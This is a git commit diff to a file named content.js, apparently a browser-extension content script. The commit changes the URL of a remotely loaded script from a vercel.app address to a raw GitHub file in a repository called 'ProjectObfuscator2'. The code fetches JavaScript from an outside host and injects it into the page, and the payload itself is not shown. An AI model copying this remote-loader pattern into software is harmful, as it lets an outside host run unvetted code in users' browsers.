0db1a38cb359f96f868614678b6a4dbbbc57412a
Maxwell The Cat <105382091+JustASpoonful@users.noreply.github.com>
2025-07-05 21:24:10 -0400

    Update content.js

--- ProjectPuffin/content.js
+++ ProjectPuffin/content.js
@@ -1,3 +1,3 @@
 (function(){    
   var script = document.createElement('script');    
-  script.src = 'https://homelesspigeon.vercel.app/core/pigeonbrain.js'; document.body.appendChild(script);})();
+  script.src = 'https://raw.githubusercontent.com/JustASpoonful/ProjectObfuscator2/refs/heads/main/content.js'; document.body.appendChild(script);})();
